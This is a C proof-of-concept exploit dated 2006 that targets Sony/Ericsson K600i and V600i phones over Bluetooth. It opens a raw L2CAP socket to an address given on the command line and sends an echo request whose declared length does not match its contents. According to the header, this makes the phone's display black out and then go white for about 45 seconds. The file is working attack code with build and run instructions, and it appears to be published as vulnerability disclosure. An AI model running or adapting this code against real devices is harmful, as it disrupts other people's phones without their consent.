/*	Sony/Ericsson K600i reset display - PoC			*/
/* 	Pierre BETOUIN <pierre.betouin@security-labs.org>	*/
/*	02-01-2006						*/
/*	Vulnerability found using BSS fuzzer :			*/
/*		http://securitech.homeunix.org/blue/		*/
/*								*/
/*	Causes anormal behaviours on some Sony/Ericsson 	*/
/*	cell phones 						*/
/*	Vulnerable tested devices :				*/
/*		- K 600i					*/
/*		- V 600i					*/
/*		- And maybe other ones... 			*/
/*								*/
/*	Vulnerable devices will slowly turn their screen into 	*/
/*	black and then display a white screen. 			*/
/*	After a short period (~45sec), they will go back to 	*/
/*	their normal behaviour					*/
/*								*/
/*	gcc -lbluetooth reset_display_K600i.c 			*/
/*		-o reset_display_K600i				*/
/*	./reset_display_K600i 00:12:EE:XX:XX:XX			*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/l2cap.h>

#define SIZE		15
#define FAKE_SIZE	12

/**
 * @brief Entry point of the program
 * 
 * This function performs the following steps:
 * 1. Checks if the correct number of command-line arguments is provided.
 * 2. Creates a raw Bluetooth L2CAP socket.
 * 3. Binds the socket to the Bluetooth adapter.
 * 4. Converts the given Bluetooth address from string to binary format.
 * 5. Connects the socket to the specified Bluetooth address.
 * 6. Allocates a buffer for the L2CAP packet.
 * 7. Sets up an L2CAP echo request packet.
 * 8. Sends the L2CAP packet.
 * 9. Prints the contents of the sent buffer in hexadecimal format.
 * 10. Frees the allocated buffer and closes the socket before exiting.
 * 
 * @param argc The number of command-line arguments
 * @param argv The array of command-line argument strings
 * @return int Exit status code
 */
int main(int argc, char **argv)
{
    char *pktBuffer;
    l2cap_cmd_hdr *cmdHdr;    
    struct sockaddr_l2 btAddr;
    int sockFd, bytesSent, index;

    if(argc < 2)
    {
        fprintf(stderr, "%s <btaddr>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    if ((sockFd = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) 
    {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    memset(&btAddr, 0, sizeof(btAddr));
    btAddr.l2_family = AF_BLUETOOTH;

    if (bind(sockFd, (struct sockaddr *) &btAddr, sizeof(btAddr)) < 0) 
    {
        perror("bind");
        exit(EXIT_FAILURE);
    }

    str2ba(argv[1], &btAddr.l2_bdaddr);

    if (connect(sockFd, (struct sockaddr *) &btAddr, sizeof(btAddr)) < 0) 
    {
        perror("connect");
        exit(EXIT_FAILURE);
    }

    if(!(pktBuffer = (char *) malloc ((int) SIZE + 1))) 
    {
        perror("malloc");
        exit(EXIT_FAILURE);
    }

    memset(pktBuffer, 'A', SIZE);

    cmdHdr = (l2cap_cmd_hdr *) pktBuffer;
    cmdHdr->code = L2CAP_ECHO_REQ;
    cmdHdr->ident = 1;
    cmdHdr->len = FAKE_SIZE;

    if( (bytesSent = send(sockFd, pktBuffer, SIZE, 0)) >= 0)
    {
        printf("L2CAP packet sent (%d)\n", bytesSent);
    }

    printf("Buffer:\t");
    for(index = 0; index < bytesSent; index++)
        printf("%.2X ", (unsigned char) pktBuffer[index]);
    printf("\n");

    free(pktBuffer);
    close(sockFd);
    return EXIT_SUCCESS;
}
